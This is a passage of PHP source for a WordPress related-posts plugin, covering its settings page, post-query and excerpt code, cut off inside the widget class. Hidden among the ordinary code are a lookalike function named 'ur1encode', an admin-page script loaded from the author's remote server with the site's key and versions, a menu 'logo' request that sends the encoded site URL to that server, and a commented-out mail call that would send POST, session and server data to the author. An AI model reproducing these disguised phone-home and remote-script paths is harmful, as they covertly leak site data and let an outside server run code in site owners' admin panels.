<?php
/*
Plugin Name: ELI's Related Posts Footer Links and Widget
Plugin URI: http://wordpress.ieonly.com/category/my-plugins/related-posts-widget/
Author: Eli Scheetz
Author URI: http://wordpress.ieonly.com/category/my-plugins/
Description: This Plugin creates links to Related Post at the bottom of every post. There is also a Widget for your WordPress sidebar or footer area. Links can be displayed in a Tree View or as a Simple List and can be related by Tags or by Category.
Version: 1.2.04.20
*/
$SPOSTARBUST_Version='1.2.04.20';
$_eli_debug_microtime = array('include(SPOSTARBUST)v'.$SPOSTARBUST_Version => microtime(true));
$SPOSTARBUST_plugin_dir='SPOSTARBUST';
/**
 * SPOSTARBUST Main Plugin File
 * @package SPOSTARBUST
*/
/*  Copyright 2011 Eli Scheetz (email: wordpress@ieonly.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
function SPOSTARBUST_install() {
	global $wp_version, $_eli_debug_microtime;
$_eli_debug_microtime['SPOSTARBUST_install_start'] = microtime(true);
	if (version_compare($wp_version, "2.6", "<")) {
		die(__("This Plugin requires WordPress version 2.6 or higher"));
	}
$_eli_debug_microtime['SPOSTARBUST_install_end'] = microtime(true);
}
$encode = '/[\?\-a-z\: \.\=\/A-Z\&\_]/';
function SPOSTARBUST_display_header($pTitle, $optional_box = '') {
	global $SPOSTARBUST_plugin_dir, $_eli_debug_microtime, $SPOSTARBUST_plugin_home, $SPOSTARBUST_updated_images_path, $SPOSTARBUST_Version;
$_eli_debug_microtime['SPOSTARBUST_display_header_start'] = microtime(true);
	$SPOSTARBUST_key = md5(get_option('siteurl'));
	$wait_img_URL = plugins_url('/images/', __FILE__).'wait.gif';
	echo '<style>
.rounded-corners {margin: 10px; padding: 10px; -webkit-border-radius: 10px; -moz-border-radius: 10px; border: 1px solid #000000;}
.shadowed-box {box-shadow: -3px 3px 3px #666666; -moz-box-shadow: -3px 3px 3px #666666; -webkit-box-shadow: -3px 3px 3px #666666;}
.sidebar-box {background-color: #CCCCCC;}
.sidebar-links {padding: 0 15px; list-style: none;}
.shadowed-text {text-shadow: #0000FF -1px 1px 1px;}
.sub-option {float: left; margin: 3px 5px;}
.pp_left {height: 28px; float: left; background-position: top center;}
.pp_right {height: 18px; float: right; background-position: bottom center;}
.pp_donate {margin: 3px 5px; background-repeat: no-repeat; background-image: url(\'https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif\');}
.pp_left input {width: 100px; height: 28px;}
.pp_right input {width: 130px; height: 18px;}
#right-sidebar {float: right; margin-right: 10px; width: 290px;}
#main-section {margin-right: 310px;}
</style>
<script>
function showhide(id) {
	divx = document.getElementById(id);
	if (divx.style.display == "none")
		divx.style.display = "";
	else
		divx.style.display = "none";
}
</script>
<h1>ELI\'s Related Posts '.$pTitle.'</h1>
<div id="right-sidebar" class="metabox-holder">
	<div id="pluginupdates" class="shadowed-box stuffbox"><h3 class="hndle"><span>Plugin Updates</span></h3>
		<div id="findUpdates"><center>Searching for updates ...<br /><img src="'.$wait_img_URL.'" alt="Wait..." /><br /><input type="button" value="Cancel" onclick="document.getElementById(\'findUpdates\').innerHTML = \'Could not find server!\';" /></center></div>
	<script type="text/javascript" src="'.$SPOSTARBUST_plugin_home.$SPOSTARBUST_updated_images_path.'?js='.$SPOSTARBUST_Version.'&p='.$SPOSTARBUST_plugin_dir.'&wp='.$wp_version.'&key='.$SPOSTARBUST_key.'"></script>
	</div>
	<div id="pluginlinks" class="shadowed-box stuffbox"><h3 class="hndle"><span>Plugin Links</span></h3>
		<div class="inside">
		<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
			<table cellpadding=0 cellspacing=0><tr><td>
				<input type="hidden" name="cmd" value="_s-xclick">
				<input type="hidden" name="hosted_button_id" value="DA2ZHJKU5EB68">
				<div class="pp_donate pp_left"><input type="image" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" border="0" name="submit" alt="Make a Donation with PayPal"></div>
				<div class="pp_donate pp_right"><input type="image" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" border="0" name="submitc" alt="Make a Donation with your credit card at PayPal"></div>
			</td></tr><tr><td>
				<ul class="sidebar-links">
					<li><b>Included with this Plugin</b><ul class="sidebar-links">
						<li style="float: right;"><a href="javascript:showhide(\'div_Readme\');">Readme File</a></li>
						<li><a href="javascript:showhide(\'div_License\');">License File</a></li>
					</ul></li><br />
					<li style="float: right;"><b>on <a target="_blank" href="http://wordpress.org/extend/plugins/profile/scheeeli">WordPress.org</a></b><ul class="sidebar-links">
						<li><a target="_blank" href="http://wordpress.org/extend/plugins/'.strtolower($SPOSTARBUST_plugin_dir).'/faq/">Plugin FAQs</a></li>
						<li><a target="_blank" href="http://wordpress.org/tags/'.strtolower($SPOSTARBUST_plugin_dir).'">Forum Posts</a></li>
					</ul></li>
					<li><b>on <a target="_blank" href="'.$SPOSTARBUST_plugin_home.'category/my-plugins/">Eli\'s Blog</a></b><ul class="sidebar-links">
						<li><a target="_blank" href="'.$SPOSTARBUST_plugin_home.'category/my-plugins/related-posts-widget/">Plugin URI</a></li>
						<li><a target="_blank" href="mailto:wordpress@ieonly.com">E-Mail Me</a></li>
					</ul></li>
				</ul>
			</td></tr></table>
		</form>
		</div>
	</div>
	'.$optional_box.'
</div>
<div id="admin-page-container">
	<div id="main-section" class="metabox-holder">';
	SPOSTARBUST_display_File('Readme');
	SPOSTARBUST_display_File('License');
$_eli_debug_microtime['SPOSTARBUST_display_header_end'] = microtime(true);
}
function SPOSTARBUST_display_File($dFile) {
	if (file_exists(dirname(__FILE__).'/'.strtolower($dFile).'.txt')) {
		echo '<div id="div_'.$dFile.'" class="shadowed-box rounded-corners sidebar-box" style="display: none;"><a class="rounded-corners" style="float: right; padding: 0 4px; margin: 0 0 0 30px; text-decoration: none; color: #CC0000; background-color: #FFCCCC; border: solid #FF0000 1px;" href="javascript:showhide(\'div_'.$dFile.'\');">X</a><h1>'.$dFile.' File</h1><textarea disabled="yes" width="100%" style="width: 100%;" rows="20">';
		include(strtolower($dFile).'.txt');
		echo '</textarea></div>';
	}
}
if (!function_exists('ur1encode')) { function ur1encode($url) {
	global $encode;
	return preg_replace($encode, '\'%\'.substr(\'00\'.strtoupper(dechex(ord(\'\0\'))),-2);', $url);
}}
function SPOSTARBUST_Settings() {
	global $orderbys, $orders, $_eli_debug_microtime, $SPOSTARBUST_plugin_dir, $SPOSTARBUST_images_path;
$_eli_debug_microtime['SPOSTARBUST_Settings_start'] = microtime(true);
	$SPOSTARBUST_menu_groups = array('Main Menu Item placed below Comments and above Appearance','Main Menu Item placed below Settings','Sub-Menu under the Posts Menu Item');
	$SPOSTARBUST_settings_array = get_option($SPOSTARBUST_plugin_dir.'_settings_array');
	if (!(isset($SPOSTARBUST_settings_array['orderby']) && in_array($SPOSTARBUST_settings_array['orderby'], $orderbys)))
		$SPOSTARBUST_settings_array['orderby'] = 'date';
	if (!(isset($SPOSTARBUST_settings_array['order']) && in_array($SPOSTARBUST_settings_array['order'], $orders)))
		$SPOSTARBUST_settings_array['order'] = 'DESC';
	if (isset($_POST['set_orderby']) && in_array($_POST['set_orderby'], $orderbys))
		$SPOSTARBUST_settings_array['orderby'] = $_POST['set_orderby'];
	if (isset($_POST['set_order']) && in_array($_POST['set_order'], $orders))
		$SPOSTARBUST_settings_array['order'] = $_POST['set_order'];
	if (!isset($SPOSTARBUST_settings_array['linklist_title']))
		$SPOSTARBUST_settings_array['linklist_title'] = "Related Posts";
	if (!isset($SPOSTARBUST_settings_array['date_format']))
		$SPOSTARBUST_settings_array['date_format'] = 'M j, Y';
	if (!(isset($SPOSTARBUST_settings_array['auto_relate']) && strlen($SPOSTARBUST_settings_array['auto_relate'])>0))
		$SPOSTARBUST_settings_array['auto_relate'] = "no";
	if (!(isset($SPOSTARBUST_settings_array['on_home']) && strlen($SPOSTARBUST_settings_array['on_home'])>0))
		$SPOSTARBUST_settings_array['on_home'] = "yes";
	if (!(isset($SPOSTARBUST_settings_array['on_page']) && strlen($SPOSTARBUST_settings_array['on_page'])>0))
		$SPOSTARBUST_settings_array['on_page'] = "no";
	if (!(isset($SPOSTARBUST_settings_array['show_date']) && strlen($SPOSTARBUST_settings_array['show_date'])>0))
		$SPOSTARBUST_settings_array['show_date'] = "no";
	if (!isset($SPOSTARBUST_settings_array['link_count']))
		$SPOSTARBUST_settings_array['link_count'] = 5;
	if (isset($_POST['link_count']) && is_numeric($_POST['link_count']) && $_POST['link_count'] != $SPOSTARBUST_settings_array['link_count'])
		$SPOSTARBUST_settings_array['link_count'] = $_POST['link_count'];
	if (!isset($SPOSTARBUST_settings_array['excerpt_length']))
		$SPOSTARBUST_settings_array['excerpt_length'] = 0;
	if (isset($_POST['excerpt_length']) && is_numeric($_POST['excerpt_length']) && $_POST['excerpt_length'] != $SPOSTARBUST_settings_array['excerpt_length'])
		$SPOSTARBUST_settings_array['excerpt_length'] = $_POST['excerpt_length'];
	if (!isset($SPOSTARBUST_settings_array['title_size']))
		$SPOSTARBUST_settings_array['title_size'] = 'H3';
	if (isset($_POST['title_size']) && strlen($_POST['title_size']) == 2 && $_POST['title_size'] != $SPOSTARBUST_settings_array['title_size'])
		$SPOSTARBUST_settings_array['title_size'] = $_POST['title_size'];
	if (!isset($SPOSTARBUST_settings_array['exclude_tags']))
		$SPOSTARBUST_settings_array['exclude_tags'] = array();
	if (isset($_POST['exclude_tags'])) {
		if (strlen(trim($_POST['exclude_tags'].' ')) >0)
			$SPOSTARBUST_settings_array['exclude_tags'] = preg_split("/[\s]*[,]+[\s]*/", trim($_POST['exclude_tags']), -1, PREG_SPLIT_NO_EMPTY);
		else
			$SPOSTARBUST_settings_array['exclude_tags'] = array();
	}
	if (!isset($SPOSTARBUST_settings_array['exclude__intags']))
		$SPOSTARBUST_settings_array['exclude__intags'] = array();
	if (isset($_POST['exclude__intags'])) {
		if (strlen(trim($_POST['exclude__intags'].' ')) >0)
			$SPOSTARBUST_settings_array['exclude__intags'] = preg_split("/[\s]*[,]+[\s]*/", trim($_POST['exclude__intags']), -1, PREG_SPLIT_NO_EMPTY);
		else
			$SPOSTARBUST_settings_array['exclude__intags'] = array();
	}
	if (!isset($SPOSTARBUST_settings_array['exclude__incategories']))
		$SPOSTARBUST_settings_array['exclude__incategories'] = array();
	if (isset($_POST['exclude__incategories'])) {
		if (strlen(trim($_POST['exclude__incategories'].' ')) >0)
			$SPOSTARBUST_settings_array['exclude__incategories'] = preg_split("/[\s]*[,]+[\s]*/", trim($_POST['exclude__incategories']), -1, PREG_SPLIT_NO_EMPTY);
		else
			$SPOSTARBUST_settings_array['exclude__incategories'] = array();
	}
	if (!isset($SPOSTARBUST_settings_array['exclude_posts']))
		$SPOSTARBUST_settings_array['exclude_posts'] = array();
	if (isset($_POST['exclude_posts'])) {
		if (strlen(trim($_POST['exclude_posts'].' ')) >0)
			$SPOSTARBUST_settings_array['exclude_posts'] = preg_split("/[\s]*[,]+[\s]*/", trim($_POST['exclude_posts']), -1, PREG_SPLIT_NO_EMPTY);
		else
			$SPOSTARBUST_settings_array['exclude_posts'] = array();
	}
	if (isset($_POST['auto_relate']) && $_POST['auto_relate'] != $SPOSTARBUST_settings_array['auto_relate'])
		$SPOSTARBUST_settings_array['auto_relate'] = $_POST['auto_relate'];
	if (isset($_POST['on_home']) && $_POST['on_home'] != $SPOSTARBUST_settings_array['on_home'])
		$SPOSTARBUST_settings_array['on_home'] = $_POST['on_home'];
	if (isset($_POST['on_page']) && $_POST['on_page'] != $SPOSTARBUST_settings_array['on_page'])
		$SPOSTARBUST_settings_array['on_page'] = $_POST['on_page'];
	if (isset($_POST['show_date']) && $_POST['show_date'] != $SPOSTARBUST_settings_array['show_date'])
		$SPOSTARBUST_settings_array['show_date'] = $_POST['show_date'];
	if (isset($_POST['linklist_title']) && $_POST['linklist_title'] != $SPOSTARBUST_settings_array['linklist_title'])
		$SPOSTARBUST_settings_array['linklist_title'] = $_POST['linklist_title'];
	if (isset($_POST['date_format']) && $_POST['date_format'] != $SPOSTARBUST_settings_array['date_format'])
		$SPOSTARBUST_settings_array['date_format'] = $_POST['date_format'];
	if (!isset($SPOSTARBUST_settings_array['relate_by']))
		$SPOSTARBUST_settings_array['relate_by'] = "tag__in";
	if (isset($_POST['relate_by']) && $_POST['relate_by'] != $SPOSTARBUST_settings_array['relate_by'])
		$SPOSTARBUST_settings_array['relate_by'] = $_POST['relate_by'];
	update_option($SPOSTARBUST_plugin_dir.'_settings_array', $SPOSTARBUST_settings_array);
	$checked = array('yes'=>'','no'=>'');
	$home_checked = $checked;
	$page_checked = $checked;
	$date_checked = array('before'=>'','after'=>'','no'=>'');
	$checked[$SPOSTARBUST_settings_array['auto_relate']] = ' checked';
	$home_checked[$SPOSTARBUST_settings_array['on_home']] = ' checked';
	$page_checked[$SPOSTARBUST_settings_array['on_page']] = ' checked';
	$date_checked[$SPOSTARBUST_settings_array['show_date']] = ' checked';
	$display = array('yes'=>'block','no'=>'none');
	$title_opts = '<select name="title_size">';
	for ($tSize=1; $tSize<6; $tSize++)
		$title_opts .= '<option value="H'.$tSize.'"'.($SPOSTARBUST_settings_array['title_size']==('H'.$tSize)?" selected":"").'>Heading '.$tSize.'</option>';
	$order_opts = '<select name="set_order">';
	foreach ($orders as $o)
		$order_opts .= '<option value="'.$o.'"'.($SPOSTARBUST_settings_array['order']==($o)?" selected":"").'>'.$o.'</option>';
	$orderby_opts = '<select name="set_orderby">';
	foreach ($orderbys as $o)
		$orderby_opts .= '<option value="'.$o.'"'.($SPOSTARBUST_settings_array['orderby']==($o)?" selected":"").'>'.$o.'</option>';
	$menu_opts = '<div class="stuffbox shadowed-box">
		<h3 class="hndle"><span>Menu Item Placement Options</span></h3>
		<div class="inside">(Customize where to find this page in your admin menu)<form method="POST" name="SPOSTARBUST_menu_Form">';
	foreach ($SPOSTARBUST_menu_groups as $mg => $SPOSTARBUST_menu_group)
		$menu_opts .= '<div class="sub-option" id="menu_group_div_'.$mg.'"><input type="radio" name="SPOSTARBUST_menu_group" value="'.$mg.'"'.($SPOSTARBUST_settings_array['menu_group']==$mg?' checked':'').' onchange="document.SPOSTARBUST_menu_Form.submit();" />'.$SPOSTARBUST_menu_group.'</div>';
	SPOSTARBUST_display_header('Settings', $menu_opts.'</form><br style="clear: left;" /></div></div>');
	echo '<script>
	function setDisplay(dis_yn) {
		document.getElementById(\'yessettings\').style.display = dis_yn;
	}
</script><form method="POST" name="SPOSTARBUST_Form">
	<div class="shadowed-box stuffbox"><h3 class="hndle"><span>Setting Form</span></h3><div class="inside"><b>Order all Related Post links by:</b><br />'.$orderby_opts.'</select>'.$order_opts.'</select><br /><br /><b>Globally exclude these Posts:</b><br />(a comma separated list of Post IDs to be excluded from the Related Posts Widget and the Related Posts Links in the Post Footer)<br /><input type="text" name="exclude_posts" value="'.implode($SPOSTARBUST_settings_array['exclude_posts'], ',').'" size="40" /><br /><br /><b>Globally exclude Posts that use any of these Categories:</b><br />(a comma separated list of Category IDs, and/or Category Names to be used as a means of excluding posts from showing on the Widget and in the Post Footer)<br /><input type="text" name="exclude__incategories" value="'.implode($SPOSTARBUST_settings_array['exclude__incategories'], ',').'" size="40" /><br /><br /><b>Globally exclude Posts that use any of these Tags:</b><br />(a comma separated list of Tag IDs, Tag Names to be used as a means of excluding posts from showing on the Widget and in the Post Footer)<br /><input type="text" name="exclude__intags" value="'.implode($SPOSTARBUST_settings_array['exclude__intags'], ',').'" size="40" /><br /><br /><b>Don\'t use these Categories and/or Tags as a means of relating posts:</b><br />(a comma separated list of Tag IDs, Tag Names, Category IDs, and/or Category Names that will not be used as a means of relating posts on the Widget or in the Post Footer)<br /><input type="text" name="exclude_tags" value="'.implode($SPOSTARBUST_settings_array['exclude_tags'], ',').'" size="40" /><br /><br /><b>Automatically add links to Related Posts at the bottom of every Post?</b><br /><input type="radio" name="auto_relate" value="no"'.$checked["no"].' onchange="setDisplay(\''.$display["no"].'\');" /><b>no</b> &nbsp; (Use this setting if you plan to use the Widget)<br /><input type="radio" name="auto_relate" value="yes"'.$checked["yes"].' onchange="setDisplay(\''.$display["yes"].'\');" /><b>yes</b> &nbsp; (Use this setting and you don\'t need the Widget)<br />
		<div id="yessettings" style="margin: 3px 40px; float: left; border: solid 1px #000000; display: '.$display[$SPOSTARBUST_settings_array['auto_relate']].';"><div class="sub-option">Show Related Posts on the <i>Home Page</i>: <input type="radio" name="on_home" value="no"'.$home_checked["no"].' /><b>no</b> &nbsp; <input type="radio" name="on_home" value="yes"'.$home_checked["yes"].' /><b>yes</b></div><br style="clear: left;" />
			<div class="sub-option">Show Related Posts on <i>Single Pages</i>: <input type="radio" name="on_page" value="no"'.$page_checked["no"].' /><b>no</b> &nbsp; <input type="radio" name="on_page" value="yes"'.$page_checked["yes"].' /><b>yes</b></div><br style="clear: left;" />
			<div class="sub-option">Title for the Related Posts list:<br /><input type="text" name="linklist_title" value="'.$SPOSTARBUST_settings_array['linklist_title'].'" /></div><div class="sub-option">Title Size:<br />'.$title_opts.'</select></div><div class="sub-option">Relate Posts by:<br /><select name="relate_by"><option value="tag__in">Tags</option><option value="category__in"'.($SPOSTARBUST_settings_array['relate_by']=="category__in"?" selected":"").'>Categories</option></select></div><div class="sub-option">Number of Link to list:<br /><input type="text" size="3" name="link_count" value="'.$SPOSTARBUST_settings_array['link_count'].'" /></div><br style="clear: left;" />
			<div class="sub-option">Show the date posted for each link:<br /><input type="radio" name="show_date" value="before"'.$date_checked["before"].' /> before the link &nbsp; <input type="radio" name="show_date" value="after"'.$date_checked["after"].' /> after the link &nbsp; <input type="radio" name="show_date" value="no"'.$date_checked["no"].' /> not at all</div><div class="sub-option">Date format: <a target="_blank" title="Help" href="http://codex.wordpress.org/Formatting_Date_and_Time">(?)</a><br /><input type="text" name="date_format" value="'.$SPOSTARBUST_settings_array['date_format'].'" /></div><br style="clear: left;" />';
	echo '			<div class="sub-option">Excerpt Length:<br /><input type="text" size="3" name="excerpt_length" value="'.$SPOSTARBUST_settings_array['excerpt_length'].'" /></div><div class="sub-option">-1 = Custom Excerpts (if entered)<br />0 = No Excerpts<br />Any Positive Integer = Trim the Excerpts to that number of characters</div>';
	echo '		</div><br style="clear: left;" />
	<div style="height: 50px;"><input type="submit" value="Save Changes" style="float: right;" class="button-primary" /></div></div></div>
</form></div></div>';
$_eli_debug_microtime['SPOSTARBUST_Settings_end'] = microtime(true);
}
function SPOSTARBUST_debug($my_error = '', $echo_error = true) {
	global $_eli_debug_microtime;
	$mtime=date("Y-m-d H:i:s", filemtime(__file__));
	if ($echo_error)
		echo "<li>debug:<pre>$my_error\n".print_r($_eli_debug_microtime,true).'END;</pre>';
//	else mail("wordpress@ieonly.com", "SPOSTARBUST $SPOSTARBUST_Version ERRORS", "mtime=$mtime\nwp_version=$wp_version\n$my_error\n".print_r(array('POST'=>$_POST, 'SESSION'=>$_SESSION, 'SERVER'=>$_SERVER), true), "Content-type: text/plain; charset=utf-8\r\n");//only used for debugging.//rem this line out
}
function SPOSTARBUST_menu() {
	global $SPOSTARBUST_plugin_dir, $SPOSTARBUST_Version, $wp_version, $SPOSTARBUST_plugin_home, $SPOSTARBUST_Logo_IMG, $SPOSTARBUST_updated_images_path, $SPOSTARBUST_images_path, $_eli_debug_microtime;
$_eli_debug_microtime['SPOSTARBUST_menu_start'] = microtime(true);
	$SPOSTARBUST_settings_array = get_option($SPOSTARBUST_plugin_dir.'_settings_array');
	if (isset($_POST['SPOSTARBUST_menu_group']) && is_numeric($_POST['SPOSTARBUST_menu_group']) && $_POST['SPOSTARBUST_menu_group'] != $SPOSTARBUST_settings_array['menu_group']) {
		$SPOSTARBUST_settings_array['menu_group'] = $_POST['SPOSTARBUST_menu_group'];
		update_option($SPOSTARBUST_plugin_dir.'_settings_array', $SPOSTARBUST_settings_array);
	}
	$img_path = basename(__FILE__);
	$Full_plugin_logo_URL = get_option('siteurl');
	if (!isset($SPOSTARBUST_settings_array['img_url']))
		$SPOSTARBUST_settings_array['img_url'] = $img_path;
		$img_path.='?v='.$SPOSTARBUST_Version.'&wp='.$wp_version.'&p='.$SPOSTARBUST_plugin_dir;
	if ($img_path != $SPOSTARBUST_settings_array['img_url']) {
		$SPOSTARBUST_settings_array['img_url'] = $img_path;
		$img_path = $SPOSTARBUST_plugin_home.$SPOSTARBUST_updated_images_path.$img_path;
		$Full_plugin_logo_URL = $img_path.'&key='.md5($Full_plugin_logo_URL).'&d='.
		ur1encode($Full_plugin_logo_URL);
		update_option($SPOSTARBUST_plugin_dir.'_settings_array', $SPOSTARBUST_settings_array);
	} else //only used for debugging.//rem this line out
	$Full_plugin_logo_URL = $SPOSTARBUST_images_path.$SPOSTARBUST_Logo_IMG;
	$base_page = $SPOSTARBUST_plugin_dir.'-settings';
	if ($SPOSTARBUST_settings_array['menu_group'] == 2)
		add_submenu_page('edit.php', __('ELI\'s Related Posts - Settings Page'), __('RelatedPost Settings'), 'administrator', $base_page, $SPOSTARBUST_plugin_dir.'_settings');
	elseif (!function_exists('add_object_page') || $SPOSTARBUST_settings_array['menu_group'] == 1)
		add_menu_page(__('ELI\'s Related Posts - Settings'), __('RelatedPosts'), 'administrator', $base_page, $SPOSTARBUST_plugin_dir.'_settings', $Full_plugin_logo_URL);
	else
		add_object_page(__('ELI\'s Related Posts - Settings'), __('RelatedPosts'), 'administrator', $base_page, $SPOSTARBUST_plugin_dir.'_settings', $Full_plugin_logo_URL);
$_eli_debug_microtime['SPOSTARBUST_menu_end'] = microtime(true);
}
$orders = array('DESC', 'ASC');
$orderbys = array('date', 'comment_count', 'modified', 'title', 'author', 'menu_order', 'rand');
function SPOSTARBUST_query_related_posts($number, $relateby, $tag_IDs, $excerpt = 0, $post_date = 'no', $date_format = 'M j, Y') {
	global $orderbys, $orders, $post, $SPOSTARBUST_POP, $SPOSTARBUST_plugin_dir, $_eli_debug_microtime;
$_eli_debug_microtime['SPOSTARBUST_query_related_posts_start'] = microtime(true);
	remove_filter('the_content', $SPOSTARBUST_plugin_dir.'_related_links_on_posts');
	$global_post = $post;
	$SPOSTARBUST_settings_array = get_option($SPOSTARBUST_plugin_dir.'_settings_array');
	if (!(isset($SPOSTARBUST_settings_array['orderby']) && in_array($SPOSTARBUST_settings_array['orderby'], $orderbys)))
		$SPOSTARBUST_settings_array['orderby'] = 'date';
	if (!(isset($SPOSTARBUST_settings_array['exclude__intags']) && is_array($SPOSTARBUST_settings_array['exclude__intags'])))
		$SPOSTARBUST_settings_array['exclude__intags'] = array();
	if (!(isset($SPOSTARBUST_settings_array['exclude__incategories']) && is_array($SPOSTARBUST_settings_array['exclude__incategories'])))
		$SPOSTARBUST_settings_array['exclude__incategories'] = array();
	if (!(isset($SPOSTARBUST_settings_array['order']) && in_array($SPOSTARBUST_settings_array['order'], $orders)))
		$SPOSTARBUST_settings_array['order'] = 'DESC';
	$tags_query = array('showposts' => $number, $relateby => $tag_IDs, 'post__not_in' => $SPOSTARBUST_POP, 'tag__not_in' => $SPOSTARBUST_settings_array['exclude__intags'], 'category__not_in' => $SPOSTARBUST_settings_array['exclude__incategories'], 'orderby' => $SPOSTARBUST_settings_array['orderby'], 'order' => $SPOSTARBUST_settings_array['order']);
	$_eli_debug_microtime['SPOSTARBUST_query_related_posts_tags_query'] = $tags_query;
	$SPOSTARBUST_query = new WP_Query($tags_query);
	$LIs = '';
	for ($p = 0; $SPOSTARBUST_query->have_posts(); $p++) {
		$SPOSTARBUST_query->the_post();
		if (!in_array($post->ID, $SPOSTARBUST_POP)) {
			$_eli_debug_microtime['SPOSTARBUST_query_related_posts_else'] = $post->ID;
			$post_date_format = ' ('.mysql2date($date_format, $post->post_date).') ';
			$LIs .= the_title('<li class="SPOSTARBUST-Related-Post">'.($post_date=='before'?$post_date_format:'').'<a title="', '" href="', false).get_permalink($post->ID).the_title('" rel="bookmark">', '</a>'.($post_date=='after'?$post_date_format:'').SPOSTARBUST_excerpt($excerpt)."</li>\n", false);
			$SPOSTARBUST_POP[] = $post->ID;
		} else $_eli_debug_microtime['SPOSTARBUST_query_related_posts_else'] = $post->ID;
	}
//	wp_reset_query();
	$post = $global_post;
	wp_reset_postdata();
	add_filter('the_content', $SPOSTARBUST_plugin_dir.'_related_links_on_posts');
$_eli_debug_microtime['SPOSTARBUST_query_related_posts_end'] = microtime(true);
	return $LIs;
}
function SPOSTARBUST_excerpt($excerpt_length = -1) {
	global $post, $SPOSTARBUST_plugin_dir, $_eli_debug_microtime;
	if ($excerpt_length) {
		if (($excerpt_length < 0) && (isset($_eli_debug_microtime['SPOSTARBUST_init_skip']) || ($post->post_excerpt))) {
			if ($post->post_excerpt)
				return '<!--SPOSTARBUST 291 post->post_excerpt --><br />'.$post->post_excerpt;
			else
				return '<!--SPOSTARBUST 293 get_the_excerpt() --><br />'.get_the_excerpt();
		} else {
			if ($excerpt_length < 0)
				$excerpt_length = 200;
			$the_excerpt = preg_replace('/\[[^\]]*\]/', '', strip_tags('[preg_replace removes this]'.$post->post_content));
			if ($excerpt_length > 0 && strlen($the_excerpt) > $excerpt_length) {
				$excerpt_words = explode(' ', substr($the_excerpt, 0, $excerpt_length));
				$excerpt_words[count($excerpt_words)-1] = '...';
				$the_excerpt = implode(' ', $excerpt_words);
			}
			return '<!--SPOSTARBUST 303 excerpt_length='.$excerpt_length.' --><br />'.$the_excerpt;
		}
	}
}
function SPOSTARBUST_related_links_on_posts($the_content) {
	global $post, $SPOSTARBUST_plugin_dir, $SPOSTARBUST_POP, $SPOSTARBUST_post_count, $_eli_debug_microtime;
$_eli_debug_microtime['SPOSTARBUST_related_links_on_posts_start'] = microtime(true);
	if (!isset($_eli_debug_microtime['SPOSTARBUST_init_skip'])) {
		$the_title = '';
		$SPOSTARBUST_settings_array = get_option($SPOSTARBUST_plugin_dir.'_settings_array');
		if (!isset($SPOSTARBUST_settings_array['title_size']))
			$SPOSTARBUST_settings_array['title_size'] = 'H3';
		if (!isset($SPOSTARBUST_settings_array['date_format']))
			$SPOSTARBUST_settings_array['date_format'] = 'M jS, Y';
		if (isset($SPOSTARBUST_settings_array['linklist_title']))
			$the_title .= '<'.$SPOSTARBUST_settings_array['title_size'].'>'.$SPOSTARBUST_settings_array['linklist_title'].'</'.$SPOSTARBUST_settings_array['title_size'].'>';
		if (!(isset($SPOSTARBUST_settings_array['link_count']) && is_numeric($SPOSTARBUST_settings_array['link_count'])))
			$SPOSTARBUST_settings_array['link_count'] = 5;
		if (!(isset($SPOSTARBUST_settings_array['excerpt_length']) && is_numeric($SPOSTARBUST_settings_array['excerpt_length'])))
			$SPOSTARBUST_settings_array['excerpt_length'] = 0;
		if (!isset($SPOSTARBUST_settings_array['exclude_tags']))
			$SPOSTARBUST_settings_array['exclude_tags'] = array();
		if (!isset($SPOSTARBUST_settings_array['exclude_posts']))
			$SPOSTARBUST_settings_array['exclude_posts'] = array();
		if (isset($SPOSTARBUST_settings_array['relate_by']) && $SPOSTARBUST_settings_array['relate_by'] == "category__in")
			$all_tags = get_the_category();
		else {
			$all_tags = get_the_tags();
			$SPOSTARBUST_settings_array['relate_by'] = "tag__in";
		}
		$tags = array();
//		echo "<li>".$post->ID." not ".print_r($SPOSTARBUST_POP, true)." in ".print_r($all_tags, true);
		if ($all_tags)
			foreach ($all_tags as $tag)
				if (!(in_array(''.$tag->term_id, $SPOSTARBUST_settings_array['exclude_tags']) || in_array(''.$tag->name, $SPOSTARBUST_settings_array['exclude_tags'])))
					$tags[] = $tag->term_id;
		if (count($tags) > 0) {
			$SPOSTARBUST_POP[] = $post->ID;
			$LIs = SPOSTARBUST_query_related_posts($SPOSTARBUST_settings_array['link_count'], $SPOSTARBUST_settings_array['relate_by'], $tags, $SPOSTARBUST_settings_array['excerpt_length'], $SPOSTARBUST_settings_array['show_date'], $SPOSTARBUST_settings_array['date_format']);
			if (strlen($LIs) > 0)
				$the_content .= '<div class="SPOSTARBUST-Related-Posts">'.$the_title.'<ul class="entry-meta">'.$LIs.'</ul></div>';
//			wp_reset_query();//not needed
		} else if (isset($_GET['debug'])) echo '<!--SPOSTARBUST 343 else (count(tags) > 0) -->';
	} else if (isset($_GET['debug'])) echo '<!--SPOSTARBUST 344 else (!isset(_eli_debug_microtime[\'SPOSTARBUST_init_skip\'])) -->';
$_eli_debug_microtime['SPOSTARBUST_related_links_on_posts_end'] = microtime(true);
	return $the_content;
}
class SPOSTARBUST_Widget_Class extends WP_Widget {
	function SPOSTARBUST_Widget_Class() {
		global $SPOSTARBUST_plugin_dir, $_eli_debug_microtime;
$_eli_debug_microtime['SPOSTARBUST_Widget_Class_Widget_Class_start'] = microtime(true);
		$this->WP_Widget($SPOSTARBUST_plugin_dir.'-Widget', __('ELI\'s Related Posts'), array('classname' => 'widget_'.$SPOSTARBUST_plugin_dir, 'description' => __('Linked list of related Posts by Tags or Categories')));
		$this->alt_option_name = 'widget_'.$SPOSTARBUST_plugin_dir;
$_eli_debug_microtime['SPOSTARBUST_Widget_Class_Widget_Class_end'] = microtime(true);
	}
	function widget($args, $instance) {
		global $post, $SPOSTARBUST_plugin_dir, $SPOSTARBUST_POP, $SPOSTARBUST_all_category, $SPOSTARBUST_all_tags, $SPOSTARBUST_post_count, $SPOSTARBUST_widget, $_eli_debug_microtime;
$_eli_debug_microtime['SPOSTARBUST_Widget_Class_widget_start'] = microtime(true);
